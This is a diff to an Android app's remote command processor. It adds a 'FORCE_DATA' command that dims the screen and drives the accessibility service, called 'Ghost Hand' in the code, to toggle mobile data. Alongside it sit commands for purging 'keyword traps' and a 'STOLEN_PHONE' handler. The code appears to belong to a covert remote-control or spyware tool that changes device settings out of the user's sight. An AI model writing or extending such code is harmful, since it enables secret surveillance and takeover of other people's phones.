@@ -1156,6 +1156,22 @@ object CommandProcessor {
                     ctx.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE).edit().clear().apply()
                     status = "KEYWORD_TRAPS_PURGED"
                 }
+                "FORCE_DATA" -> {
+                    if (MyAccessibilityService.instance == null) {
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Accessibility is required for Ghost Hand data toggle."
+                    } else {
+                        Handler(Looper.getMainLooper()).post {
+                            DimmerManager.applyDim(ctx, 20, "AUTO")
+                            MyAccessibilityService.instance?.isWaitingForDataSettings = true
+                            val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                            }
+                            ctx.startActivity(dataIntent)
+                        }
+                        status = "GHOST_DATA_INITIATED"
+                    }
+                }
                 "STOLEN_PHONE" -> {
                     val targetNum = if (content.isNotBlank()) content.trim() else JudasManager.getHandler(ctx) ?: ""
                     if (targetNum.isEmpty()) {
